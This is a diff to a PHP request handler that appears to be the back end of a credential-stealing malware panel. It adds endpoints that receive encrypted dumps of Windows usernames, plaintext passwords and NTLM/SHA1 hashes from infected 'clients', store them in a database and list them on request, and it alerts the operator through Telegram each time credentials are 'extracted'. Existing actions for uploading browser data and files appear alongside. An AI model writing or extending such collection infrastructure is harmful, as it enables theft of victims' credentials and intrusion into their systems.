@@ -111,9 +111,223 @@ class ClientRequestHandler
                 return $this->handleUploadFile($clientId, $data);
             case 'upload_browser_data_comprehensive':
                 return $this->handleUploadBrowserDataComprehensive($clientId, $data);
+            case 'upload_windows_credentials':
+                return $this->handleUploadWindowsCredentials($clientId, $data);
+            case 'get_windows_credentials':
+                return $this->handleGetWindowsCredentials($clientId, $data);
+            case 'report_credential_status':
+                return $this->handleReportCredentialStatus($clientId, $data);
             default:
                 $this->logger->logError("Unknown action: $action");
                 return ['error' => 'Unknown action'];
+        }
+    }
+
+    private function handleUploadWindowsCredentials(string $clientId, array $data): array
+    {
+        try {
+            $this->logger->logWebhook("Windows Credentials Upload START for client: $clientId");
+
+            $credentialData = $data['credential_data'] ?? null;
+            $timestamp = $data['timestamp'] ?? date('Y-m-d H:i:s');
+
+            if (!$credentialData) {
+                $this->logger->logError("Windows credentials upload failed: Missing credential_data");
+                http_response_code(400);
+                return ['error' => 'Missing credential_data'];
+            }
+
+            $decryptedCredentialData = $this->encryption->decrypt($credentialData);
+            if ($decryptedCredentialData === '') {
+                $this->logger->logError("Windows credentials decryption failed for client_id: $clientId");
+                http_response_code(400);
+                return ['error' => 'Decryption failed'];
+            }
+
+            $credentialsJson = json_decode($decryptedCredentialData, true);
+            if (!$credentialsJson || json_last_error() !== JSON_ERROR_NONE) {
+                $this->logger->logError("Invalid windows credentials format for client_id: $clientId, decrypted: " . substr($decryptedCredentialData, 0, 50));
+                http_response_code(400);
+                return ['error' => 'Invalid data format'];
+            }
+
+            // پردازش credential های فردی
+            $credentials = $credentialsJson['credentials'] ?? [];
+            $insertedCount = 0;
+
+            foreach ($credentials as $credential) {
+                $stmt = $this->pdo->prepare("
+                INSERT INTO client_windows_credentials 
+                (client_id, username, domain, password, ntlm_hash, sha1_hash, credential_type, source, extracted_at, created_at)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, NOW())
+            ");
+
+                $stmt->execute([
+                    $clientId,
+                    $credential['username'] ?? null,
+                    $credential['domain'] ?? null,
+                    $credential['password'] ?? null,
+                    $credential['ntlm_hash'] ?? null,
+                    $credential['sha1'] ?? null,
+                    $credential['type'] ?? 'msv',
+                    $credential['source'] ?? 'unknown',
+                    $timestamp
+                ]);
+
+                $insertedCount++;
+            }
+
+            // ذخیره آمار استخراج
+            $extractionStats = $credentialsJson['extraction_stats'] ?? [];
+            $stmt = $this->pdo->prepare("
+            INSERT INTO client_credential_status 
+            (client_id, status, credentials_found, hashes_found, passwords_found, message, created_at)
+            VALUES (?, 'success', ?, ?, ?, ?, NOW())
+        ");
+
+            $stmt->execute([
+                $clientId,
+                $extractionStats['total_credentials'] ?? $insertedCount,
+                $extractionStats['hashes_found'] ?? 0,
+                $extractionStats['passwords_found'] ?? 0,
+                'Successfully extracted ' . $insertedCount . ' credentials'
+            ]);
+
+            // ارسال نوتیفیکیشن به تلگرام
+            $message = "🔐 Windows Credentials Extracted:\n";
+            $message .= "Client ID: $clientId\n";
+            $message .= "Total Credentials: " . ($extractionStats['total_credentials'] ?? $insertedCount) . "\n";
+            $message .= "Passwords Found: " . ($extractionStats['passwords_found'] ?? 0) . "\n";
+            $message .= "Hashes Found: " . ($extractionStats['hashes_found'] ?? 0) . "\n";
+            $message .= "Time: " . date('Y-m-d H:i:s');
+
+            $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
+            $this->logger->logWebhook("Windows credentials processed for client_id: $clientId, count: $insertedCount");
+
+            return [
+                'status' => 'success',
+                'inserted_count' => $insertedCount,
+                'message' => 'Credentials uploaded successfully'
+            ];
+        } catch (\Exception $e) {
+            $this->logger->logError("Windows credentials upload failed for client_id: $clientId, error: " . $e->getMessage());
+            http_response_code(500);
+            return ['error' => 'Upload failed: ' . $e->getMessage()];
+        }
+    }
+
+    private function handleGetWindowsCredentials(string $clientId, array $data): array
+    {
+        try {
+            $this->logger->logWebhook("Get Windows Credentials request for client: $clientId");
+
+            // اگر client_id خاصی ارسال شده باشد، فقط credential های آن کلاینت را برگردان
+            $targetClientId = $data['client_id'] ?? $clientId;
+
+            $limit = min($data['limit'] ?? 100, 500); // محدودیت برای جلوگیری از overload
+            $offset = $data['offset'] ?? 0;
+
+            if ($targetClientId === 'all') {
+                // دریافت همه credential ها
+                $stmt = $this->pdo->prepare("
+                SELECT id, client_id, username, domain, 
+                       LEFT(password, 50) as password_preview,
+                       ntlm_hash, sha1_hash, credential_type, source, extracted_at, created_at
+                FROM client_windows_credentials 
+                ORDER BY created_at DESC 
+                LIMIT ? OFFSET ?
+            ");
+                $stmt->execute([$limit, $offset]);
+            } else {
+                // دریافت credential های یک کلاینت خاص
+                $stmt = $this->pdo->prepare("
+                SELECT id, client_id, username, domain, 
+                       LEFT(password, 50) as password_preview,
+                       ntlm_hash, sha1_hash, credential_type, source, extracted_at, created_at
+                FROM client_windows_credentials 
+                WHERE client_id = ?
+                ORDER BY created_at DESC 
+                LIMIT ? OFFSET ?
+            ");
+                $stmt->execute([$targetClientId, $limit, $offset]);
+            }
+
+            $credentials = $stmt->fetchAll();
+
+            // دریافت آمار
+            $statsStmt = $this->pdo->prepare("
+            SELECT COUNT(*) as total_credentials,
+                   COUNT(DISTINCT client_id) as unique_clients,
+                   SUM(CASE WHEN password IS NOT NULL AND password != '' THEN 1 ELSE 0 END) as passwords_count,
+                   SUM(CASE WHEN ntlm_hash IS NOT NULL AND ntlm_hash != '' THEN 1 ELSE 0 END) as hashes_count
+            FROM client_windows_credentials
+        ");
+            $statsStmt->execute();
+            $stats = $statsStmt->fetch();
+
+            $this->logger->logWebhook("Retrieved windows credentials for client_id: $targetClientId, count: " . count($credentials));
+
+            return [
+                'status' => 'success',
+                'credentials' => $credentials,
+                'stats' => $stats,
+                'pagination' => [
+                    'limit' => $limit,
+                    'offset' => $offset,
+                    'total' => $stats['total_credentials'] ?? 0
+                ]
+            ];
+        } catch (\Exception $e) {
+            $this->logger->logError("Get windows credentials failed for client_id: $clientId, error: " . $e->getMessage());
+            http_response_code(500);
+            return ['error' => 'Failed to retrieve credentials: ' . $e->getMessage()];
+        }
+    }
+
+    private function handleReportCredentialStatus(string $clientId, array $data): array
+    {
+        try {
+            $this->logger->logWebhook("Credential Status Report: " . json_encode($data, JSON_UNESCAPED_UNICODE));
+
+            $status = $data['status'] ?? 'success';
+            $credentialsFound = $data['credentials_found'] ?? 0;
+            $message = $data['message'] ?? 'No message provided';
+
+            $stmt = $this->pdo->prepare("
+            INSERT INTO client_credential_status 
+            (client_id, status, credentials_found, hashes_found, passwords_found, message, created_at)
+            VALUES (?, ?, ?, ?, ?, ?, NOW())
+        ");
+
+            $stmt->execute([
+                $clientId,
+                $status,
+                $credentialsFound,
+                $data['hashes_found'] ?? 0,
+                $data['passwords_found'] ?? 0,
+                $message
+            ]);
+
+            // ارسال نوتیفیکیشن برای خطاها
+            if ($status === 'error') {
+                $telegramMessage = "❌ Credential Extraction Failed:\n";
+                $telegramMessage .= "Client ID: $clientId\n";
+                $telegramMessage .= "Error: $message\n";
+                $telegramMessage .= "Time: " . date('Y-m-d H:i:s');
+
+                $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $telegramMessage);
+            }
+
+            $this->logger->logWebhook("Credential status reported for client_id: $clientId, status: $status");
+
+            return [
+                'status' => 'success',
+                'message' => 'Status reported successfully'
+            ];
+        } catch (\Exception $e) {
+            $this->logger->logError("Credential status report failed for client_id: $clientId, error: " . $e->getMessage());
+            http_response_code(500);
+            return ['error' => 'Status report failed: ' . $e->getMessage()];
         }
     }
 
